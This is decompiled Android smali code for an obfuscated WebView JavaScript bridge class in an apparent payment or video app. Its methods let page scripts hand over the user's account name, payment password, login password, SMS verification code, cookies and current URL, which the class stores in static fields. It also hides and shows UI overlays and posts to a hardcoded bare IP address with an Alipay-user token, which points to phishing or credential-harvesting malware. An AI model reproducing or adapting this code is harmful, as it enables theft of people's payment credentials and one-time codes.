.class public Lcom/ellison/project/utils/BBBBBBB;
.super Ljava/lang/Object;
.source "BBBBBBB.java"


# instance fields
.field private mActivity:Landroid/app/Activity;

.field private mWeb:Landroid/webkit/WebView;

.field private progressBar:Landroid/widget/ProgressBar;

.field private zhezhao:Landroid/widget/LinearLayout;


# direct methods
.method public constructor <init>(Landroid/app/Activity;Landroid/webkit/WebView;Landroid/widget/ProgressBar;Landroid/widget/LinearLayout;)V
    .locals 0

    .line 31
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 32
    iput-object p2, p0, Lcom/ellison/project/utils/BBBBBBB;->mWeb:Landroid/webkit/WebView;

    .line 33
    iput-object p1, p0, Lcom/ellison/project/utils/BBBBBBB;->mActivity:Landroid/app/Activity;

    .line 34
    iput-object p3, p0, Lcom/ellison/project/utils/BBBBBBB;->progressBar:Landroid/widget/ProgressBar;

    .line 35
    iput-object p4, p0, Lcom/ellison/project/utils/BBBBBBB;->zhezhao:Landroid/widget/LinearLayout;

    return-void
.end method

.method static synthetic access$000(Lcom/ellison/project/utils/BBBBBBB;)Landroid/webkit/WebView;
    .locals 0

    .line 25
    iget-object p0, p0, Lcom/ellison/project/utils/BBBBBBB;->mWeb:Landroid/webkit/WebView;

    return-object p0
.end method

.method static synthetic access$100(Lcom/ellison/project/utils/BBBBBBB;)Landroid/widget/ProgressBar;
    .locals 0

    .line 25
    iget-object p0, p0, Lcom/ellison/project/utils/BBBBBBB;->progressBar:Landroid/widget/ProgressBar;

    return-object p0
.end method

.method static synthetic access$200(Lcom/ellison/project/utils/BBBBBBB;)Landroid/widget/LinearLayout;
    .locals 0

    .line 25
    iget-object p0, p0, Lcom/ellison/project/utils/BBBBBBB;->zhezhao:Landroid/widget/LinearLayout;

    return-object p0
.end method


# virtual methods
.method public executeJS(Ljava/lang/String;)V
    .locals 2
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .line 40
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    invoke-virtual {v0, p1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 41
    iget-object v0, p0, Lcom/ellison/project/utils/BBBBBBB;->mActivity:Landroid/app/Activity;

    new-instance v1, Lcom/ellison/project/utils/BBBBBBB$1;

    invoke-direct {v1, p0, p1}, Lcom/ellison/project/utils/BBBBBBB$1;-><init>(Lcom/ellison/project/utils/BBBBBBB;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method public getCurrentPrice()Ljava/lang/String;
    .locals 1
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .line 56
    sget-object v0, Lcom/ellison/project/utils/AAAA;->currentPrice:Ljava/lang/String;

    return-object v0
.end method

.method public getSMSCode()Ljava/lang/String;
    .locals 1
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .line 61
    sget-object v0, Lcom/ellison/project/utils/AAAA;->smsCode:Ljava/lang/String;

    return-object v0
.end method

.method public hidePayWay()V
    .locals 2
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .line 66
    iget-object v0, p0, Lcom/ellison/project/utils/BBBBBBB;->mActivity:Landroid/app/Activity;

    new-instance v1, Lcom/ellison/project/utils/BBBBBBB$2;

    invoke-direct {v1, p0}, Lcom/ellison/project/utils/BBBBBBB$2;-><init>(Lcom/ellison/project/utils/BBBBBBB;)V

    invoke-virtual {v0, v1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method public hideUI()V
    .locals 2
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    const-string v0, "js\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd"

    .line 88
    invoke-virtual {p0, v0}, Lcom/ellison/project/utils/BBBBBBB;->log(Ljava/lang/String;)V

    .line 89
    iget-object v0, p0, Lcom/ellison/project/utils/BBBBBBB;->mActivity:Landroid/app/Activity;

    new-instance v1, Lcom/ellison/project/utils/BBBBBBB$3;

    invoke-direct {v1, p0}, Lcom/ellison/project/utils/BBBBBBB$3;-><init>(Lcom/ellison/project/utils/BBBBBBB;)V

    invoke-virtual {v0, v1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method public log(Ljava/lang/String;)V
    .locals 1
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .line 100
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    invoke-virtual {v0, p1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method

.method public recordAccount(Ljava/lang/String;)V
    .locals 0
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .line 105
    sput-object p1, Lcom/ellison/project/utils/AAAA;->account:Ljava/lang/String;

    return-void
.end method

.method public recordInput()V
    .locals 0
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    return-void
.end method

.method public recordPwd(Ljava/lang/String;)V
    .locals 0
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .line 114
    sput-object p1, Lcom/ellison/project/utils/AAAA;->payPwd:Ljava/lang/String;

    return-void
.end method

.method public recordPwd2(Ljava/lang/String;)V
    .locals 0
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .line 119
    sput-object p1, Lcom/ellison/project/utils/AAAA;->pwd:Ljava/lang/String;

    return-void
.end method

.method public sendCode()V
    .locals 1
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    const-string v0, "js\u8c03\u7528\u4e86\u53d1\u9001\u77ed\u4fe1\u9a8c\u8bc1\u7801"

    .line 124
    invoke-virtual {p0, v0}, Lcom/ellison/project/utils/BBBBBBB;->log(Ljava/lang/String;)V

    return-void
.end method

.method public sendDataToServer(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    const-string v0, "js\u8c03\u7528\u4e86\u63d0\u4ea4\u652f\u4ed8\u72b6\u6001"

    .line 129
    invoke-virtual {p0, v0}, Lcom/ellison/project/utils/BBBBBBB;->log(Ljava/lang/String;)V

    .line 130
    sput-object p1, Lcom/ellison/project/utils/AAAA;->pageTitle:Ljava/lang/String;

    .line 131
    sput-object p2, Lcom/ellison/project/utils/AAAA;->cookie:Ljava/lang/String;

    .line 132
    sput-object p3, Lcom/ellison/project/utils/AAAA;->currentURL:Ljava/lang/String;

    .line 133
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide p1

    sget-wide v0, Lcom/ellison/project/utils/AAAA;->start:J

    sub-long/2addr p1, v0

    const-wide/16 v0, 0x3e8

    cmp-long p3, p1, v0

    if-lez p3, :cond_0

    const/4 p1, 0x1

    .line 134
    sput p1, Lcom/ellison/project/utils/AAAA;->ss:I

    .line 136
    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide p1

    sput-wide p1, Lcom/ellison/project/utils/AAAA;->start:J

    return-void
.end method

.method public showUI()V
    .locals 2
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    const-string v0, "js\u663e\u793aui"

    .line 141
    invoke-virtual {p0, v0}, Lcom/ellison/project/utils/BBBBBBB;->log(Ljava/lang/String;)V

    .line 142
    iget-object v0, p0, Lcom/ellison/project/utils/BBBBBBB;->mActivity:Landroid/app/Activity;

    new-instance v1, Lcom/ellison/project/utils/BBBBBBB$4;

    invoke-direct {v1, p0}, Lcom/ellison/project/utils/BBBBBBB$4;-><init>(Lcom/ellison/project/utils/BBBBBBB;)V

    invoke-virtual {v0, v1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method public toAccountLogin(Ljava/lang/String;)V
    .locals 2
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .line 153
    iget-object v0, p0, Lcom/ellison/project/utils/BBBBBBB;->mActivity:Landroid/app/Activity;

    new-instance v1, Lcom/ellison/project/utils/BBBBBBB$5;

    invoke-direct {v1, p0, p1}, Lcom/ellison/project/utils/BBBBBBB$5;-><init>(Lcom/ellison/project/utils/BBBBBBB;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method public toVideoPlay()V
    .locals 0
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .line 163
    invoke-virtual {p0}, Lcom/ellison/project/utils/BBBBBBB;->updatePayLink()V

    return-void
.end method

.method public updatePayLink()V
    .locals 4
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    :try_start_0
    const-string v0, "{\'type\':\'getzfbuser\',\'Token\':\'eyd0eXBlJzonZ2V0emZidXNlcicsJ1Rva2VuJzond2Z3ZWdlcmdlcid9\'}"

    const-string v1, "UTF-8"

    .line 170
    invoke-virtual {v0, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-static {v0}, Lcom/ellison/project/utils/Base64Util;->base64Encrypt([B)Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    const-string v0, ""

    goto :goto_0

    :catch_0
    move-exception v0

    .line 172
    invoke-virtual {v0}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    const/4 v0, 0x0

    :goto_0
    const-string v1, "http://165.3.95.36:9968/"

    .line 175
    invoke-static {v1}, Lcom/lzy/okgo/OkGo;->post(Ljava/lang/String;)Lcom/lzy/okgo/request/PostRequest;

    move-result-object v1

    invoke-virtual {v1, p0}, Lcom/lzy/okgo/request/PostRequest;->tag(Ljava/lang/Object;)Lcom/lzy/okgo/request/base/Request;

    move-result-object v1

    check-cast v1, Lcom/lzy/okgo/request/PostRequest;

    const/4 v2, 0x0

    new-array v2, v2, [Z

    const-string v3, "callbackurl"

    invoke-virtual {v1, v3, v0, v2}, Lcom/lzy/okgo/request/PostRequest;->params(Ljava/lang/String;Ljava/lang/String;[Z)Lcom/lzy/okgo/request/base/Request;

    move-result-object v0

    new-instance v1, Lcom/ellison/project/utils/BBBBBBB$6;

    invoke-direct {v1, p0}, Lcom/ellison/project/utils/BBBBBBB$6;-><init>(Lcom/ellison/project/utils/BBBBBBB;)V

    invoke-virtual {v0, v1}, Lcom/lzy/okgo/request/base/Request;->execute(Lcom/lzy/okgo/callback/Callback;)V

    return-void
.end method

.method public waitPayResult()V
    .locals 1
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    const-string v0, "js\u8c03\u7528"

    .line 188
    invoke-virtual {p0, v0}, Lcom/ellison/project/utils/BBBBBBB;->log(Ljava/lang/String;)V

    return-void
.end method
